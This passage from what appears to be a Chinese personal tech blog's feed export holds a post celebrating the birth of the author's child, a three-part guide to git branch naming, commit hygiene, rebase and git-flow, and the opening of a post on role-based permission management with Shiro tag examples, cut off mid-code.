      <url>https://qqdong.github.io/2018/03/22/%E5%B0%8F%E6%9B%BC%E8%80%81%E5%B8%88/</url>
      <content type="html"><![CDATA[<p>今天是宝宝出生第三天，小眼睛可以和我对视了，圆圆的小脸蛋很帅气，很像我 ：） 虽然在医院陪护了三天，昨天晚上又折腾了一晚，还是很精神，大概是内心的喜悦和兴奋感还没过吧。</p>
<p>特别庆幸和感恩的是那个她，度过了艰难的一关。刚怀孕去医院检查时，医生就不建议我们要，因为她身体一直不好，血小板和红细胞一直比较低，之前去过好多医院都没有确诊。 </p>
<p>她知道对宝宝没有影响后，顶着内心的不安和不适，坚持要下来。期间，隔三差五的去医院，血液科、产科交替着看，中间还冒风险做了一次骨穿。怕影响我工作，很少让我陪她去，在无数次的地铁和公交拥挤中，有一个坚强、勇敢的身影。</p>
<p>生宝宝时，宫口要生生开到十指，过程是那么的漫长和痛苦，那种疼我无法亲身体验，但透过她的吼叫、表情、求饶可以深深的感觉到。</p>
<p>宫口开到七指时，把她从待产室送进产房后，我就被要求出去了，漫长的焦虑和等待后，从门缝隙中听到了宝宝的哭声，当时很激动，紧绷的内心也稍稍放松了一点。不多久，从她的电话中，听到了温暖的声音，知道她没事之后，才完全放松下来。</p>
<p>她就是我的老婆，那个善良、开朗的小曼老师，很怕疼但勇敢地坚持了下来，在3月20号，3点20分，生下了我们的宝宝。</p>
<p>叫她老师，是因为她教了我很多，影响了我很多。</p>
<p>我们是在朋友的介绍下相识的，当时都在合肥，在一段时间的相处和了解后，就确定了关系。我当时比较内向，不善言谈和相处，被她的真实、善良、开朗的性格所打动。她也说：“从来没有这么在意和喜欢一个人”，我想这就是缘分吧。</p>
<p>和她在一起后，给了我很大的激励，教我如何更好的与他人沟通，如何正确看待自己的优点和缺点。最重要的是，她一点也不会在意我的不善言谈，总是和我分享她身边的一些人和事，和我一起去她想去的地方，让我不那么自卑，眼界也开阔了很多。</p>
<p>现在的我，很多地方已经让自己满意了，相信有了宝宝，我会更加努力，变得更好。</p>
<p>感谢你，小曼老师，我的老婆。</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15217021163496.jpg" alt="小宝宝"></p>
]]></content>
      
        <categories>
            
            <category> life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 家人 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[git分支管理和工作流规范：不同场景细化和演示]]></title>
      <url>https://qqdong.github.io/2018/03/14/git%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86%E5%92%8C%E5%B7%A5%E4%BD%9C%E6%B5%81%E8%A7%84%E8%8C%83%EF%BC%9A%E4%B8%8D%E5%90%8C%E5%9C%BA%E6%99%AF%E7%BB%86%E5%8C%96%E5%92%8C%E6%BC%94%E7%A4%BA%20/</url>
      <content type="html"><![CDATA[<p>前两篇介绍了 <a href="http://qqidol.com/2018/03/12/git%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86%E5%92%8C%E5%B7%A5%E4%BD%9C%E6%B5%81%E8%A7%84%E8%8C%83%EF%BC%9A%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/" target="_blank" rel="noopener">git基本概念</a> 和 <a href="http://qqidol.com/2018/03/13/git%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86%E5%92%8C%E5%B7%A5%E4%BD%9C%E6%B5%81%E8%A7%84%E8%8C%83%EF%BC%9A%E5%85%B7%E4%BD%93%E8%A7%84%E8%8C%83/" target="_blank" rel="noopener">具体的规范</a>，本篇针对不同的使用场景做演示。</p>
<h4 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h4><h5 id="分支命名"><a href="#分支命名" class="headerlink" title="分支命名"></a>分支命名</h5><ul>
<li>master 分支名称保持不变</li>
<li>develop 分支名称保持不变</li>
<li>feature/&lt;分支名称&gt; 功能分支</li>
<li>release/&lt;分支名称&gt;　待上线分支</li>
<li>hotfix/&lt;分支名称&gt;　线上紧急修复分支</li>
</ul>
<h5 id="拉取远程分支"><a href="#拉取远程分支" class="headerlink" title="拉取远程分支"></a>拉取远程分支</h5><p>git checkout -b &lt;分支名称&gt; origin/&lt;分支名称&gt;　拉取并关联远程分支</p>
<h5 id="创建新分支"><a href="#创建新分支" class="headerlink" title="创建新分支　"></a>创建新分支　</h5><p>git checkout -b &lt;分支名称＞　　创建新分支并切换到新分支</p>
<a id="more"></a>
<h4 id="提交备注规范"><a href="#提交备注规范" class="headerlink" title="提交备注规范"></a>提交备注规范</h4><p>首行，简明扼要地描述更新内容;<br>空出一行;<br>之后，详细描述更新内容。</p>
<p>如果对应jira的问题，填写jira路径：issue：<a href="http://jira.n.xiaomi.com/test1" target="_blank" rel="noopener">http://jira.n.xiaomi.com/test1</a></p>
<p>举例</p>
<blockquote>
<p>修复bug，工单详情页面，工单记录页面，客服头像不显示<br>&lt;空行占位符&gt;<br>导致原因：代码逻辑考虑不全<br>jira: <a href="http://jira.n.xiaomi.com/test1" target="_blank" rel="noopener">http://jira.n.xiaomi.com/test1</a></p>
</blockquote>
<h4 id="如何整理自己的commit，保持commit清晰"><a href="#如何整理自己的commit，保持commit清晰" class="headerlink" title="如何整理自己的commit，保持commit清晰"></a>如何整理自己的commit，保持commit清晰</h4><p>git commit –amend 修改最近一次提交;<br>git rebase 　-i　 整理提交</p>
<ul>
<li>edit，编辑某一次提交的备注；</li>
<li>squash，把当前commit向前合并，一直合并到pick为止；</li>
<li>fixup，和squash非常类似，唯一的区别就是，fixup会忽略当前commit的信息；</li>
</ul>
<p>再次强调：如果commit已经提交到远程git仓库，一定不要再进行整理合并commit。</p>
<p>举例说明</p>
<ol>
<li><p>基于develop分支创建一个功能分支，名称为feature/feature1;</p>
<p>git checkout -b feature/feature1</p>
</li>
<li><p>新建一个文件test.txt，提交;</p>
<p>git commit -m ‘add test.txt file’</p>
</li>
<li><p>修改文件test.txt，添加一行内容，提交;</p>
<p>git commit -m ‘update text.txt file， append content: love vae music’</p>
</li>
<li><p>发现上一步添加的内容错误，想修改内容，但不添加新的commit<br>修改为正确的内容;</p>
<p> git commit —amend; 会弹出修改窗口，修改注释，如果不变，直接回车;</p>
</li>
<li><p>连续提交3个commit，但想合并为1个commit;<br><img src="http://oc3r3rke2.bkt.clouddn.com/15210370718875.jpg" alt=""></p>
</li>
<li><p>使用git log，确定要rebase的commit-id；</p>
</li>
<li><p>git rebase -i df87607d5dd24c0a73f23284e6988d6d32c0d3a4 显示编辑窗口<br><img src="http://oc3r3rke2.bkt.clouddn.com/15210380257144.jpg" alt=""></p>
</li>
<li><p>进行编辑，修改如下：<br><img src="http://oc3r3rke2.bkt.clouddn.com/15210380926438.jpg" alt=""></p>
</li>
<li><p>最终结果只会保留commit1：<br><img src="http://oc3r3rke2.bkt.clouddn.com/15210381153047.jpg" alt=""></p>
</li>
</ol>
<h4 id="新人加入，如何加入开发"><a href="#新人加入，如何加入开发" class="headerlink" title="新人加入，如何加入开发"></a>新人加入，如何加入开发</h4><p>从远程拉取develop分支：<br>git checkout -b &lt;分支名称&gt; origin/&lt;分支名称&gt;　拉取并关联远程分支</p>
<p>如果要开发新功能，基于develop分支创建feature分支：<br>git checkout -b feature/feature1</p>
<p>如果要修复线上紧急bug，基于master分支创建hotfix分支：<br>git checkout -b hotfix/hotfix1</p>
<h4 id="开发一个feature"><a href="#开发一个feature" class="headerlink" title="开发一个feature"></a>开发一个feature</h4><p>基于develop分支创建feature分支;</p>
<p>开发完成后，整理自己的commit，把无意义的commit进行合并;</p>
<p>准备在下一次迭代上线，整理完成后，合并到develop分支;</p>
<p>不准备在下一次迭代上线，整理完成后，push当前分支到远程git仓库，等待准备上线时，再合并到develop分支：<br>git push origin feature/feature1:feature/feature1</p>
<p>合并到develop分支前，一定要经过本地测试！</p>
<h4 id="确定版本上线计划及上线"><a href="#确定版本上线计划及上线" class="headerlink" title="确定版本上线计划及上线"></a>确定版本上线计划及上线</h4><p>整体上，要有明确的上线计划，确定每次上线哪些功能;</p>
<p>只有确认在下一次版本上线的feature才能合并到develop分支；</p>
<h4 id="提交测试，修复测试反馈的bug"><a href="#提交测试，修复测试反馈的bug" class="headerlink" title="提交测试，修复测试反馈的bug"></a>提交测试，修复测试反馈的bug</h4><p>提交测试前，确保所有人的代码修改都已提交到develop分支;</p>
<p>基于develop分支，创建release分支：<br>git checkout -b release/release1</p>
<p>发布release/release1分支到测试环境，测试人员进行测试；</p>
<p>测试过程中发现的bug，直接在release分支进行修复并提交;</p>
<p>测试完成，确认上线，合并代码到master分支和develop分支，用release分支名打Tag，删除release分支：<br>git tag release.1.1.1<br>git branch -d release/release1</p>
<h4 id="修复线上bug"><a href="#修复线上bug" class="headerlink" title="修复线上bug"></a>修复线上bug</h4><p>基于master分支，创建hotfix分支<br>git checkout -b hotfix/hotfix1</p>
<p>修复完成后，finish hotfix，合并代码到master和develop分支;</p>
<p><strong>欢迎扫描下方二维码，关注我的个人微信公众号 ~</strong></p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> 版本控制 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[git分支管理和工作流规范：具体规范]]></title>
      <url>https://qqdong.github.io/2018/03/13/git%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86%E5%92%8C%E5%B7%A5%E4%BD%9C%E6%B5%81%E8%A7%84%E8%8C%83%EF%BC%9A%E5%85%B7%E4%BD%93%E8%A7%84%E8%8C%83/</url>
      <content type="html"><![CDATA[<p>前一篇介绍了 <a href="http://qqidol.com/2018/03/12/git%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86%E5%92%8C%E5%B7%A5%E4%BD%9C%E6%B5%81%E8%A7%84%E8%8C%83%EF%BC%9A%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/" target="_blank" rel="noopener">git相关的概念</a>，我们可以查看文件的状态，在各个状态之间进行切换，可以创建和合并分支，通过rebase还可以整理自己的提交历史。通过这些命令和操作，就可完成工作流规范规定的操作流程了。</p>
<p>本篇介绍具体的规范，包括分支的划分和命名规范，不同类型的分支应对不同的场景，然后会介绍下工作流工具git-flow，如何简化我们的操作。</p>
<a id="more"></a>
<h4 id="分支构成"><a href="#分支构成" class="headerlink" title="分支构成"></a>分支构成</h4><p>master和develop分支一直存在，且名称不会变化，一般不直接修改这2个分支，由其他分支合并而来。</p>
<p>feature、release、hotfix分别用于功能点开发、优化，特定版本测试，线上问题紧急处理，同一类型的分支会产生多个。</p>
<p>分支划分如下：</p>
<ul>
<li>master：与线上版本保持绝对一致；</li>
<li>develop：开发分支，由下文提到的release、feature、hotfix分支合并过后的代码；</li>
<li>feature：实际功能点开发分支，建议每个功能新建一个feature， 具有关联关系的功能公用一个feature分支；</li>
<li>release：每一次开发完成之后，从develop创建出来的分支，以此分支为基准，进行测试；</li>
<li>hotfix：该分支主要用于修复线上bug；</li>
</ul>
<p>命名规范约定如下：</p>
<ul>
<li>feature分支命名：feature/name</li>
<li>release分支命名：release/name</li>
<li>hotfix分支命名：hotfix/name</li>
</ul>
<p>比如有一个「优化分布式Session」的需求，可在develop分支的基础上创建新分支 feature/optimize_distributed_session进行开发，开发完成后合并到develop分支。</p>
<h4 id="分支详细介绍和处理流程"><a href="#分支详细介绍和处理流程" class="headerlink" title="分支详细介绍和处理流程"></a>分支详细介绍和处理流程</h4><h5 id="master分支"><a href="#master分支" class="headerlink" title="master分支"></a>master分支</h5><p>主分支，与线上运行的版本始终保持一致，任何时候都不要直接修改master分支。</p>
<p>一个版本的release分支、hotfix分支开发完成后，会合并代码到master分支，也就是说master分支主要来源于release分支和hotfix分支。</p>
<h5 id="develop分支"><a href="#develop分支" class="headerlink" title="develop分支"></a>develop分支</h5><p>开发分支，始终保持最新完成以及bug修复后的代码，新增功能时基于该分支创建feature分支。</p>
<p>一个版本的release分支、hotfix分支开发完成后，也会合并到develop分支，另外，一个版本的feature功能开发完成后，也会合并到develop分支。也就是说develop分支来源于feature、release、hotfix分支。</p>
<h5 id="feature分支"><a href="#feature分支" class="headerlink" title="feature分支"></a>feature分支</h5><p>开发新功能或优化现有功能时，会创建feature分支，以develop为基础创建。一般会有多个功能同时开发，但上线时间可能不同，在适当的时候将特定的feature分支合并到develop分支，并创建release分支，进入测试状态。</p>
<h5 id="release分支"><a href="#release分支" class="headerlink" title="release分支"></a>release分支</h5><p>当一组feature开发完成，会首先合并到develop分支，开始进入提测阶段时，会创建release分支。</p>
<p>以release分支代码为基准提测，测试过程中若存在bug需要修复，则直接由开发者在release分支修复并提交。</p>
<p>测试完成之后，合并release分支到master和develop分支，此时master为最新代码，用作上线。</p>
<h5 id="hotfix分支"><a href="#hotfix分支" class="headerlink" title="hotfix分支"></a>hotfix分支</h5><p>线上出现紧急问题时，需要及时修复，以master分支为基线，创建hotfix分支，修复完成后，需要合并到master分支和develop分支。</p>
<h4 id="特殊情况处理和注意点"><a href="#特殊情况处理和注意点" class="headerlink" title="特殊情况处理和注意点"></a>特殊情况处理和注意点</h4><p>develop分支已存在未上线的feature代码, 此时需要紧急上线一个新功能, 但develop的代码不能上，如何处理 ？</p>
<ul>
<li>以master为基线创建feature， 在完成之后，代码合并到master分支；</li>
<li>为了保证develop是最新代码，需要从master合并到develop分支；</li>
</ul>
<p>以develop为基线，创建了f1和f2两个feature分支之后, f1,f2开发一半的时候，发现两个分支代码需要有依赖怎么办 ？</p>
<ul>
<li>最好在开发开始前确定两个功能是否相关,若相关则只创建一个分支,两个功能在一起开发;</li>
<li>如果已经创建，则需要合并到一个分支；</li>
</ul>
<p>一定要保证commit历史记录的整洁，代码合并时，根据情况选择merge或rebase;</p>
<p>使用rebase注意，一旦分支中的提交对象发布到公共仓库，就千万不要对该分支进行衍合操作；</p>
<p>提交说明规范：</p>
<ul>
<li>提交说明最好限制在一行以内，50个字符以下，简明扼要地描述更新内容，空开一行后，再展开详细注解；</li>
<li>如果关联jira，写上jira地址；</li>
</ul>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15208707147106.jpg?imageView2/2/w/600" alt="git-flow工作流"></p>
<h4 id="git-flow工具"><a href="#git-flow工具" class="headerlink" title="git-flow工具"></a>git-flow工具</h4><p>上面的流程在第一次接触时，会觉得有点复杂，通过git-flow工具可以把这些流程自动化。它是一个命令行工具，支持各个平台，比如OSX、Linux、Windows等支持。</p>
<h5 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h5><p>通过 git flow init 命令进行初始化，以交互式的方式进行，主要是约定分支的命名，建议使用默认值；</p>
<h5 id="开发新功能"><a href="#开发新功能" class="headerlink" title="开发新功能"></a>开发新功能</h5><p>git flow feature start f1 添加新特性，这个操作创建了一个基于develop的特性分支，并切换到这个分支之下。</p>
<p>git flow feature finish f1 完成新特性，这个操作会合并f1分支到develop分支，并删除特性分支，切换回develop分支。</p>
<p>git flow feature publish f1 发布新分支，发布新特性分支到远程服务器，其它用户也可以使用这分支。</p>
<h5 id="发布版本"><a href="#发布版本" class="headerlink" title="发布版本"></a>发布版本</h5><p>git flow release start r1 [BASE] 创建发布版本，[BASE]是以哪个分支或commit为基础进行发版，一般为develop。</p>
<p>git flow release publish r1 发布release分支，其他同事就可以看到这个分支，并修改一些小问题。</p>
<p>git flow release finish r1 完成release分支，会合并release分支到master分支，用release分支名打Tag，合并release分支到 develop分支，最后移除release分支。</p>
<h5 id="修复线上问题"><a href="#修复线上问题" class="headerlink" title="修复线上问题"></a>修复线上问题</h5><p>有可能需要修正 master 分支上某个 TAG 标记的生产版本。</p>
<p>git flow hotfix start VERSION [BASENAME] 创建hotfix分支，VERSION 参数标记着修正版本，[BASENAME]为finish release时填写的版本号。</p>
<p>git flow hotfix finish VERSION，当完成紧急修复分支，代码合并到develop和 master分支。相应地，master分支打上修正版本的 TAG。</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15209529278788.jpg" alt="git flow命令"></p>
<p><strong>欢迎扫描下方二维码，关注我的个人微信公众号 ~</strong></p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> 版本控制 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[git分支管理和工作流规范：基本概念说明]]></title>
      <url>https://qqdong.github.io/2018/03/12/git%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86%E5%92%8C%E5%B7%A5%E4%BD%9C%E6%B5%81%E8%A7%84%E8%8C%83%EF%BC%9A%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
      <content type="html"><![CDATA[<p>「单点登录与权限管理」系列第二部分，Demo项目的设计和开发，需要一段时间才能完成。这段时间，会把以前学习、实践、梳理过的知识分享给大家，希望大家能够喜欢。</p>
<p>接下来，会分享「git分支管理和工作流规范」相关内容，当一个项目大了后，会有多人共同协作开发，如果没有相关规范，代码合并的时候会有很多冲突，代码的版本和提交历史也会显得很乱。针对这2个问题，可以通过分支的管理、工作流规范很好的解决。</p>
<p>针对不同的场景创建不同的分支，始终保持主分支可靠、干净，比如新增功能、修复线上问题、修复测试环境的bug等场景，需要创建不同的分支。另外，要对下一版本要上线的功能提前规划好，把功能细分，分配给每个人去完成，功能相互依赖的在同一个分支，不确定要上线的功能要单独创建分支，这样可以减少合并时的冲突。</p>
<p>提交代码时，要保持提交历史的清晰，提交的注释也要规范，关于提交历史，总结了3个要点：</p>
<ul>
<li>一个git用户非常重要的技能是能够维护一个清晰的语义化的变更历史;</li>
<li>通过查看版本变更历史就可以反映出团队的开发目的、功能变更；</li>
<li>版本变更历史记录的是代码的发展，而不是开发者在编码时的活动；</li>
</ul>
<p>会分3篇文章分享「git分支管理和工作流规范」：</p>
<ul>
<li>git相关概念</li>
<li>具体规范</li>
<li>不同场景细化和演示</li>
</ul>
<p>本篇主要介绍下git相关概念，太基础的我就不介绍了，网上资料比较多，主要包括：</p>
<ul>
<li>文件的状态</li>
<li>分支的概念</li>
<li>merge合并</li>
<li>rebase衍合</li>
<li>git工作流程</li>
</ul>
<a id="more"></a>
<h4 id="文件的状态"><a href="#文件的状态" class="headerlink" title="文件的状态"></a>文件的状态</h4><h5 id="状态类型"><a href="#状态类型" class="headerlink" title="状态类型"></a>状态类型</h5><ul>
<li>已修改：修改了某个文件，但还没有提交保存;(没有add)</li>
<li>已暂存：已修改的文件放在下次提交时要保存的清单中;（已add，没有commit）</li>
<li>已提交：文件已经被安全地保存在本地数据库中;（已commit）</li>
</ul>
<h5 id="工作目录、暂存目录、git目录"><a href="#工作目录、暂存目录、git目录" class="headerlink" title="工作目录、暂存目录、git目录"></a>工作目录、暂存目录、git目录</h5><p>3个目录与文件的状态是对应的，不同的状态放在不同的目录。</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15208675599393.jpg" alt="git的3个目录"></p>
<h5 id="git对象"><a href="#git对象" class="headerlink" title="git对象"></a>git对象</h5><ul>
<li>对象包括提交、文件树、文件内容、其他操作对象;</li>
<li>用40位十六进制数字组成;</li>
<li>可通过git cat-file 命令查看对象信息;</li>
</ul>
<h5 id="基本工作流程"><a href="#基本工作流程" class="headerlink" title="基本工作流程"></a>基本工作流程</h5><ul>
<li>在工作目录中修改某些文件;</li>
<li>对修改后的文件进行快照，然后保存到暂存区;</li>
<li>提交更新，将保存在暂存区域的文件快照永久转储到git目录中;</li>
</ul>
<h5 id="状态相关命令"><a href="#状态相关命令" class="headerlink" title="状态相关命令"></a>状态相关命令</h5><ul>
<li>git status 显示哪些文件已修改、哪些文件已暂存、未提交;</li>
<li>git diff 比较不同状态的文件<ul>
<li>默认比较工作目录、暂存区文件快照的差异;（修改后，未暂存的文件）</li>
<li>–cached 比较已暂存、上次提交时的快照之间的差异;</li>
</ul>
</li>
<li>git reset 进行撤销操作，将当前分支重设到指定的commit<ul>
<li>–hard 重设工作目录和暂存区；</li>
<li>–mixed 默认方式，仅重设暂存区，工作目录不变；</li>
<li>–soft 仅仅把HEAD指向，commit之后的commit会进入暂存区；</li>
</ul>
</li>
</ul>
<h4 id="分支的概念"><a href="#分支的概念" class="headerlink" title="分支的概念"></a>分支的概念</h4><p>本质上，分支仅仅是指向commit对象的可变指针。</p>
<p>git如何知道你当前在哪个分支上工作？</p>
<ul>
<li>保存着一个名为HEAD的特保指针；</li>
<li>HEAD是一个指向你正在工作中的本地分支的指针；</li>
</ul>
<p>通过git branch -a 查看分支时，会看到所有分支，包括本地分支、远程分支；</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15208686635198.jpg" alt="分支的概念"></p>
<p>分支的合并主要有2种方式，merge和rebase。merge主要是自动合并，针对不同场景有不同的合并策略，rebase主要是手动合并，可针对每次commit指定不同的合并策略，下面会分别介绍。</p>
<h4 id="merge合并"><a href="#merge合并" class="headerlink" title="merge合并"></a>merge合并</h4><ul>
<li>–commit –no-commit 合并后，是否自动产生一个合并结果的commit节点;</li>
<li>–edit –no-edit 是否接受自动合并的信息;</li>
<li>–ff –no-ff选项<ul>
<li>默认情况下，git执行“快进式合并”(fast-farward merge)，不会创造一个新的commit节点;</li>
<li>–no-ff，会创建一个新的commit;</li>
</ul>
</li>
<li>–log –no-log<ul>
<li>合并提交时，除了分支名以外，是否还包括commit节点的日志信息</li>
</ul>
</li>
<li>–squash<ul>
<li>不保留待合并分支上的历史信息，也不提交、不移动HEAD，需要一个额外的commit命令;</li>
<li>判断是否使用–squash选项的最根本的标准是，待合并分支上的历史是否有意义;</li>
</ul>
</li>
<li>– abort<ul>
<li>抛弃当前合并冲突的处理过程并尝试重建合并前的状态;</li>
</ul>
</li>
</ul>
<h4 id="rebase衍合"><a href="#rebase衍合" class="headerlink" title="rebase衍合"></a>rebase衍合</h4><blockquote>
<p>$ git rebase -i [branch|]</p>
</blockquote>
<p>三个操作命令：–continue、–absort 和 –skip，这三个命令的意思分别是“继续”、“退出”和“跳过”</p>
<p>一定要注意的地方：</p>
<ul>
<li>一旦分支中的提交对象发布到公共仓库，就千万不要对该分支进行衍合操作;<ul>
<li>在进行衍合的时候，实际上抛弃了一些现存的提交对象而创造了一些类似但不同的新的提交对象;</li>
<li>如果你把原来分支中的提交对象发布出去，并且其他人更新下载后在其基础上开展工作，而稍后你又用git rebase 抛弃这些提交对象，把新的重演后的提交对象发布出去的话，你的合作者就不得不重新合并他们的工作，这样当你再次从他们那里获取内容时，提交历史就会变得一团糟;</li>
</ul>
</li>
<li>把衍合当成一种在推送之前清理提交历史的手段，而且仅仅衍合那些尚未公开的提交对象；</li>
</ul>
<p>具体的示例，网上资料很多，就不在此说明了。</p>
<h4 id="git工作流"><a href="#git工作流" class="headerlink" title="git工作流"></a>git工作流</h4><p>协作必须有一个规范的工作流程，让大家有效地合作，使得项目井井有条地发展下去。</p>
<p>网上对这一部分的介绍也很多，介绍比较多的就是git flow规范，可以参考下面2篇文章：<br>[1] <a href="http://www.ruanyifeng.com/blog/2015/12/git-workflow.html" target="_blank" rel="noopener">阮一峰：git工作流程</a><br>[2] <a href="http://danielkummer.github.io/git-flow-cheatsheet/index.zh_CN.html#getting_started" target="_blank" rel="noopener">git-flow工具</a></p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15208707147106.jpg?imageView2/2/w/600" alt="git-flow工作流"></p>
<p>最后附上常用的命令速查表：</p>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15208708063651.jpg?imageView2/2/w/600" alt="git常用命令速查表"></p>
<p><strong>欢迎扫描下方二维码，关注我的个人微信公众号 ~</strong></p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> 版本控制 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[单点登录与权限管理本质：权限管理介绍]]></title>
      <url>https://qqdong.github.io/2018/03/11/%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%E6%9C%AC%E8%B4%A8%E4%B9%8B%E4%BA%94%EF%BC%9A%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E4%BB%8B%E7%BB%8D/</url>
      <content type="html"><![CDATA[<p>前面几篇文章介绍了单点登录的本质，包括cookie、session、重定向的基本概念，单点登录的基本交互流程，cookie的重要性和安全问题。单点登录能够确保：必须通过身份验证后，才能访问网站，且访问多个系统时，只需要登录一次。</p>
<p>该系列的完整写作计划，可见：<a href="http://qqidol.com/2018/02/24/%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%E4%B8%8E%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E7%B3%BB%E5%88%97/" target="_blank" rel="noopener">系列概述</a></p>
<p>一般系统都会有多个角色，不同角色可访问的系统功能不同，通过给用户分配不同角色，决定用户可访问的系统功能。</p>
<p>继续介绍「单点登录与权限管理」系列的第一部分：单点登录与权限管理本质，本篇说说权限管理，主要从以下几个方面介绍：</p>
<ul>
<li>权限管理的一般模型</li>
<li>权限验证范围</li>
<li>Shiro基本架构和扩展点</li>
<li>系列第一部分总结</li>
</ul>
<a id="more"></a>
<h4 id="权限管理的一般模型"><a href="#权限管理的一般模型" class="headerlink" title="权限管理的一般模型"></a>权限管理的一般模型</h4><p>权限验证的过程比较简单，描述如下：</p>
<ol>
<li>用户登录成功后，会将自己的个人信息和权限信息，保存到session中，可以存储在内存、redis中；</li>
<li>用户访问其他页面时，会根据访问路径，与用户权限数据进行匹配，验证是否有权限访问；</li>
<li>如果有权限，显示访问页面，如果无权限，提示用户无权访问；</li>
</ol>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15207455711934.jpg" alt="权限验证基本流程"></p>
<p>如何管理和分配用户权限呢，一般会抽象出如下实体概念：</p>
<ol>
<li>用户：访问系统的主体；</li>
<li>角色：分配权限的最小单元，通过角色给用户分配权限；</li>
<li>权限菜单：权限的最小单元，一个角色配置多个权限菜单；</li>
</ol>
<p><img src="http://oc3r3rke2.bkt.clouddn.com/15207465649533.jpg" alt="权限管理实体"></p>
<p>另外，为了方便权限管理，会单独抽取一个服务「用户中心」，统一管理用户、角色和各个系统的权限菜单。权限菜单由各个子系统同步到「用户中心」或者提供批量导入的功能，权限菜单标识的规则要提前约定好，一致的菜单标识有助于权限拦截的判断。</p>
<p>简单截取几个我们项目中的页面，加深下理解：</p>
<ol>
<li><p>添加用户时，需要选择角色<br><img src="http://oc3r3rke2.bkt.clouddn.com/15207476922851.jpg" alt=""></p>
</li>
<li><p>添加角色时，需要选择权限菜单<br><img src="http://oc3r3rke2.bkt.clouddn.com/15207478700902.jpg" alt=""></p>
</li>
<li><p>权限菜单由各个子系统同步过来</p>
</li>
</ol>
<h4 id="权限验证范围"><a href="#权限验证范围" class="headerlink" title="权限验证范围"></a>权限验证范围</h4><p>用户拥有了访问和操作某些数据的权限，但不代表可以访问所有的数据，可能只能访问和操作自己的数据，可能只能访问和操作组内的数据，这是更细粒度的权限控制。</p>
<p>权限验证的位置可能在前端、可能在后端。前端根据当前用户的权限，显示不同的菜单项、操作按钮，后端根据当前用户的权限，验证操作的合法性，返回可访问的数据集合，权限验证位置也要考虑全面。</p>
<h5 id="控制粒度"><a href="#控制粒度" class="headerlink" title="控制粒度"></a>控制粒度</h5><p>比如有这样一个场景：有一个查询订单接口供外部调用，可根据订单编号返回订单详情。</p>
<p>如果订单编号有规则可寻，且后端不对订单所属人进行判断，就可以查看其他人订单的信息，所以，需要更细粒度的判断，验证订单的所属人。</p>
<p>另外可以通过角色、菜单权限2个粒度进行权限验证：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">shiro:hasPermission</span> <span class="attr">name</span>=<span class="string">"permission1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>拥有permission1权限可以看到这里<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">shiro:hasPermission</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">shiro:hasRole</span> <span class="attr">name</span>=<span class="string">"role"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>拥有role角色可以看到这里<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">shiro:hasRole</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="验证位置"><a href="#验证位置" class="headerlink" title="验证位置"></a>验证位置</h5><p>为了让用户体验足够好，用户无法操作的菜单项和操作按钮不需要再显示了，需要在前端进行验证，比如添加用户的操作：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">shiro:hasPermission</span> <span class="attr">name</span>=<span class="string">"user:add"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'user/add'</span>&gt;</span>添加用户<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 